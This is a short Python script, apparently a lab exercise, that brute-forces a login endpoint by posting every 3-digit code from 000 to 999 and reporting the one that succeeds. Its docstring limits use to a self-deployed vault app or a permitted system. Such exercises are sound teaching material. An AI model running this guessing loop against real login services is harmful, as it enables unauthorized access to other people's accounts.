"""
brute_force.py — try every 3-digit code (000-999) against the vault login
endpoint and print the one that returns a successful response.

Only point this at the vault app you deployed yourself (or another
system you own / have explicit permission to test).
"""

import sys
import requests

DEFAULT_URL = "http://localhost:5000/login"


def brute_force(url):
    for i in range(1000):
        guess = f"{i:03d}"
        response = requests.post(url, data={"password": guess})
        if response.status_code == 200:
            print(f"\nPassword found: {guess}")
            return guess
        print(f"tried {guess} - failed ({response.status_code})", end="\r")
    print("\nNo password worked in range 000-999.")
    return None


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_URL
    brute_force(target)
